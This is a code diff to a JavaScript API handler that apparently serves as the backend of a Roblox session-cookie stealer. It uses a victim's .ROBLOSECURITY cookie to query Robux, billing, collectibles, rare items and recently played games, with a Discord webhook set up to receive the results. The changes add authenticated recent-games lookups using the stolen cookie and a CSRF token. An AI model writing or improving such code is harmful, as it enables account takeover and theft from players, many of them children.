@@ -1,7 +1,7 @@
 // api/submit.js
 const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;
 
-// ---------- Helper: get CSRF token ----------
+// ---------- CSRF token ----------
 async function getCsrfToken(cookie) {
   const res = await fetch("https://auth.roblox.com/v2/logout", {
     method: "GET",
@@ -97,7 +97,7 @@ async function getBilling(cookie, csrfToken) {
   }
 }
 
-// ---------- Groups membership count ----------
+// ---------- Groups ----------
 async function getGroupsCount(userId) {
   try {
     const res = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`);
@@ -131,7 +131,7 @@ async function getTotalPlaceVisits(userId) {
   return totalVisits;
 }
 
-// ---------- Collectibles (full list for third embed) ----------
+// ---------- Collectibles ----------
 async function getAllCollectibles(userId, cookie) {
   let items = [];
   let cursor = null;
@@ -150,7 +150,7 @@ async function getAllCollectibles(userId, cookie) {
   }));
 }
 
-// ---------- Email verification ----------
+// ---------- Email verification (Verified hat) ----------
 async function isEmailVerified(userId, cookie) {
   try {
     const res = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/102611803/is-owned`, {
@@ -178,25 +178,61 @@ async function checkItemOwnership(userId, cookie, assetId) {
   }
 }
 
-// ---------- FIXED: Get user's FAVORITE games (reliable alternative to 'Continue') ----------
-async function getFavoriteGames(userId) {
+// ---------- RECENT GAMES (no favorites) ----------
+async function getRecentlyPlayedGames(userId, cookie, csrfToken) {
+  // Primary method: official recent-games endpoint with CSRF token
   try {
-    const res = await fetch(`https://games.roblox.com/v2/users/${userId}/favorite/games`);
-    if (!res.ok) return [];
-    const data = await res.json();
-    return data.data.map(game => game.name);
+    const res = await fetch(`https://games.roblox.com/v1/users/${userId}/recent-games`, {
+      headers: {
+        Cookie: `.ROBLOSECURITY=${cookie}`,
+        "X-CSRF-TOKEN": csrfToken || "",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json"
+      }
+    });
+    if (res.ok) {
+      const data = await res.json();
+      const games = data.data || [];
+      console.log(`[recent-games] Found ${games.length} recent games`);
+      return games.map(g => g.name).filter(Boolean);
+    } else {
+      console.warn(`[recent-games] HTTP ${res.status}, body: ${await res.text()}`);
+    }
   } catch (e) {
-    console.warn("Failed to fetch favorite games:", e.message);
-    return [];
+    console.warn("[recent-games] fetch error:", e.message);
   }
+
+  // Fallback: Continue endpoint (also gives recent games)
+  try {
+    const res = await fetch("https://www.roblox.com/charts/v2/Continue", {
+      headers: {
+        Cookie: `.ROBLOSECURITY=${cookie}`,
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Referer": "https://www.roblox.com/home",
+        "X-Requested-With": "XMLHttpRequest"
+      }
+    });
+    if (res.ok) {
+      const data = await res.json();
+      const games = Array.isArray(data) ? data : (data.data || []);
+      console.log(`[Continue] Found ${games.length} recent games`);
+      return games.map(g => g.name || g.displayName || "").filter(Boolean);
+    }
+  } catch (e) {
+    console.warn("[Continue] fallback failed:", e.message);
+  }
+
+  return [];
 }
 
-async function getPlayedPasses(userId) {
+async function getPlayedPasses(userId, cookie, csrfToken) {
   const targetGames = ["Pet Simulator 99", "Breaking Point 2", "Murder Mystery 2"];
-  const favoriteGames = await getFavoriteGames(userId);
-  console.log("User's favorite games:", favoriteGames);
+  const recentGames = await getRecentlyPlayedGames(userId, cookie, csrfToken);
+  console.log("Recent games list for matching:", recentGames);
   return targetGames.map(name => {
-    const played = favoriteGames.some(g => g.toLowerCase().includes(name.toLowerCase()));
+    const played = recentGames.some(g => g.toLowerCase().includes(name.toLowerCase()));
     return { name, played: played ? "True" : "False" };
   });
 }
@@ -219,7 +255,7 @@ async function getCountryFlag(req) {
   return '🌍 Unknown';
 }
 
-// ---------- Avatar URL ----------
+// ---------- Avatar ----------
 async function getUserAvatarUrl(userId) {
   try {
     const res = await fetch(
@@ -248,7 +284,7 @@ export default async function handler(req, res) {
     try {
       csrfToken = await getCsrfToken(cookie);
     } catch (e) {
-      console.warn("CSRF token not obtained, billing/settings may be defaults.");
+      console.warn("CSRF token not obtained, recent games may fall back.");
     }
 
     const [userData, robux, pendingRobux, groupsCount, totalVisits, allCollectibles, playedPasses, countryFlag, avatarUrl, emailVerified, korblox, headless] = await Promise.all([
@@ -258,12 +294,12 @@ export default async function handler(req, res) {
       getGroupsCount(rbxuid),
       getTotalPlaceVisits(rbxuid),
       getAllCollectibles(rbxuid, cookie),
-      getPlayedPasses(rbxuid),
+      getPlayedPasses(rbxuid, cookie, csrfToken),
       getCountryFlag(req),
       getUserAvatarUrl(rbxuid),
       isEmailVerified(rbxuid, cookie),
-      checkItemOwnership(rbxuid, cookie, 1373933),
-      checkItemOwnership(rbxuid, cookie, 134082613)
+      checkItemOwnership(rbxuid, cookie, 1373933),      // Korblox
+      checkItemOwnership(rbxuid, cookie, 134082613)     // Headless
     ]);
 
     let settings = { verified: "False", banned: "False" };
